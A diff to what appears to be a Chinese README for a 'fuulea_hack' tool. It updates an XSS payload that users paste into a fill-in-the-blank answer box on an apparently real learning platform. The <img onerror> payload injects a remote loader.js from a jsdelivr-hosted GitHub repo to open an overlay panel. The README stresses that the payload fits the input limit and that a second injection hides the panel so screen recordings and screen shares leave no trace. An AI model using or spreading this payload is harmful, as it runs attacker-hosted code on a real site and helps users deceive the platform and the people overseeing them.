@@ -7,7 +7,7 @@
 贴进「注释填空」的输入框，随便答错提交：
 
 ```html
-<img src=x onerror="with(document)body.appendChild(createElement('script')).src='//cdn.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@v2.14/loader.js'">
+<img src=x onerror="with(document)body.appendChild(createElement('script')).src='//cdn.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@v2.15/loader.js'">
 ```
 
 147 字符，刚好卡在输入框上限内。面板出现在右下角。**再注入一次就是隐形开关**：面板开着时注入 → 整块隐藏；再注入 → 显形。藏起来时页面里只剩你原本的内容，录屏、投屏都不留痕迹。
